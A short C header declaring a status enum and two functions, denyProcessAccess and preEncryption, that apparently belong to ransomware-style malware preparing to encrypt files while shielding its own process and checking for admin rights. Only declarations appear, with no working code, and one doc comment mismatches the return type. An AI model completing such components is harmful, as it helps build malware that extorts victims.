#pragma once

typedef enum PRE_STATUS
{
	PSTATUS_SUCCESS,
	PSTATUS_GOT_ADMIN,
	PSTATUS_TOKEN_ERROR,
	PSTATUS_DENY_PROCESS_ERROR
} PreStatus_t;

/// <summary>
/// Attempt to deny access to the current process.
/// </summary>
/// <returns>True if denied access to the current process, FALSE, otherwise.</returns>
PreStatus_t denyProcessAccess();

/// <summary>
/// Perform all pre-encryption related tasks.
/// </summary>
/// <returns>One of the statuses.</returns>
PreStatus_t preEncryption();